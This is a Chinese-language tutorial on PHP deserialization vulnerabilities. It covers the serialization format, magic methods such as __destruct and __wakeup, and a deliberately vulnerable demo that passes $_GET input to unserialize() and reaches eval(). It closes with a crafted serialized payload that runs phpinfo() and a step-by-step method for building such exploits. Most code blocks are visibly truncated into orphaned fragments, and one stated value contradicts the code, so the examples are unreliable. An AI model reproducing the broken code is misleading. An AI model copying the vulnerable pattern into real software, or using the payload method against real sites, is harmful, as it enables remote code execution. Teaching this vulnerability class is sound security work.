PHP反序列化

0x01什么是序列化和反序列化

PHP的序列化

php的序列化是一个将各种类型的数据压缩并按照一定格式存储的过程，它所使用的函数是serialize()。

实例：

name=$name;

        public function get_name(){
            return $this->name;

    }
    $user=new Person();
    $user->set_name('Rollinon');
    $data=serialize($user);
    echo $data;
?>

依次解释如下：

O代表Object对象；

6代表类名长度是6

Person代表类名；

3代表类中的属性有3个；

s:12:"<0x00>Person<0x00>name";s:8:"Rollinon";<0x00>无法显示，其中s代表String类型，12代表属性名<0x00>Person<0x00>name的长度，<0x00>会占一个长度，s代表String类型，8代表属性值的长度，Rollinon是属性值；

s:9:"<0x00>*<0x00>gender";s:4:"male";其中s代表String类型，9代表属性名<0x00>*<0x00>gender的长度，s代表String类型，4代表属性值的长度，male是属性值；

s:3:"age";i:18;其中s代表String类型，3代表属性名age的长度，i代表integer类型，17是属性值

注意 :

  1. 不同类型类属性

    private属性序列化的格式：%00类名%00属性名
    protected属性序列化的格式：%00*%00属性名

  1. 序列化只序列化类属性，不序列化类方法

因此在利用反序列化漏洞的时候：

  1. 一定要保证在当前的作用域环境下有该类存在

  2. 攻击的时候也就是依托类属性进行攻击

PHP的反序列化

有序列化对象为压缩格式化的字符串，就有反序列化将压缩格式化的字符串还原，依旧沿用以上代码，先将序列化的内容放在serialize.txt中，然后进行反序列化，并输出属性值name和age的值:

name=$name;
        }

        public function get_name(){
            return $this->name;
        }
    }
    $user=new Person();
    $user->set_name('Rollinon');
    $data=serialize($user);
//    echo $data;
    $data=unserialize($data);
    echo $data->age;
    echo $data->get_name();
?>

输出：

18Rollinon

那么如果$data参数是用户可控的呢？例如传入如下参数：

O:6:"Person":3:{s:12:" Person name";s:6:"Hacker";s:9:" * gender";s:6:"female";s:3:"age";i:17;}

人为的改变了类属性的值，由此引出PHP反序列化漏洞。

0x02 PHP反序列化漏洞

反序列化漏洞的成因在于代码中的unserialize()接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现攻击。

魔法方法

PHP将所有以__（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以__为前缀。常见魔术方法：

__construct()  类的构造函数
__destruct()   类的虚构函数
__call()     在对象中调用一个不可访问方法时调用
__callStatic() 用静态方式调用一个不可访问方法时调用
__get()        获得一个类的成员变量时调用
__set()        设置一个类的成员变量时调用
__isset()      当对不可访问属性调用isset()或empty()时调用
__unset()      当对不可访问属性调用unset()时被调用
__sleep()      执行serialize()时，会先调用这个函数
__wakeup()     执行unserialize()时，会先调用这个函数
__toString()   类被当作字符串处理时的回应方法
__invoke()     调用函数的方法调用一个对象时的回应方法
__set_state()  调用var_export()导出类时，此静态方法会被调用
__clone()      当对象复制完成时调用
__autoload()   尝试加载未定义类
__debugInfo()  打印所需调试信息

  1. __construct()：当对象创建时会自动调用（但在unserialize()时是不会自动调用的）

  2. __wakeup()：unserialize()时会自动调用

  3. __destruct()：当对象销毁时会自动调用

  4. __toString()：当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用

  5. __get()：当从不可访问的属性读取数据

  6. __call()：在对象上下文中调用不可访问的方法时触发

实例：

name=$name;
            echo "this is __construct"."\n";

        function __destruct(){

__toString()触发方式比较多：

  1. echo($obj)/print($obj)打印时会触发

  2. 反序列化对象与字符串连接时

  3. 反序列化对象参与格式化字符串时

  4. 反序列化对象与字符串进行比较时（PHP进行比较的时候会转换参数类型）

  5. 反序列化对象参与格式化SQL语句，绑定参数时

  6. 反序列化对象在经过PHP字符串函数，如strlen()、addslashes()时

  7. 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候，toString会被调用

  8. 反序列化的对象作为class_exists()参数的时候

魔法方法的作用

在攻击中，反序列化函数unserialize()作为攻击的入口，即只要这个参数可控，就能传入任何已序列化的对象（只要这个类在当前作用于存在，我们就可以利用），而不是局限在出现unserialize()函数的类的对象，如果只能局限于当前类，则攻击面就太狭小了，这个类不调用危险方法就很难发起攻击。

但我们在反序列化其他类对象之后，仅仅是控制了属性，并没有在完成反序列化后的代码中调用其它类对象的方法，此时就需要魔法方法发挥作用。

魔法方法的调用是在该类序列化或反序列化的同时自动完成的，不需要人工干预，因此只要魔法方法中出现一些我们能利用的函数，就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到发动攻击的目的。

魔法方法的简单利用

test=new L();
        }

        function __destruct()
        {
            $this->test->action();
        }
    }

    class L{
        function action(){
            echo "function action() in class L";
        }
    }

    class Evil{
        var $test2;
        function action(){
            eval($this->test2);
        }
    }

    unserialize($_GET['test']);
?>

以上unserialize()函数的参数是可控的，也就是说能通过这个接口反序列化任何类 的对象（但只有在当前作用域的类才对我们有用），查看当前这三个类，能看到后面两个类反序列化以后对我们没有任何意义，因为其中的方法无法被我们调用。但第一个类中的魔法函数__destruct()，在对象销毁时自动调用。

可以看到__destruct()里面只用到一个属性test，再看看哪些地方调用了action()函数，看看这个函数的调用中是否存在命令执行或者其他可利用点。果然再Evil这个类中发现它的action()调用了eval()函数。那么只需将demo这个类中的test属性篡改为Evil这个类的对象，然后将Evil对象的test2属性更改为执行的命令。

test=new Evil();
        }
    }
    class Evil{
        var $test2="phpinfo();";
    }
    $demo=new demo();
    $data=serialize($demo);
    file_put_contents("serialize.txt",$data);
?>

Payload：

?test=O:4:"demo":1:{s:10:"%00demo%00test";O:4:"Evil":1:{s:5:"test2";s:10:"phpinfo();";}}

总结

通过这个例子我们总结一下寻找PHP反序列化漏洞的方法或者流程

  1. 寻找unserialize()函数的参数是否可控；

  2. 寻找反序列化的目标，重点寻找wakeup()或destruct()魔法函数的类；

  3. 一层一层研究该类在魔法方法中使用的属性和属性调用的方法，查看是否有可控的属性能实现在当前调用过程中触发；

  4. 找到可控的属性后将部分代码复制下来，构造序列化，发起攻击。
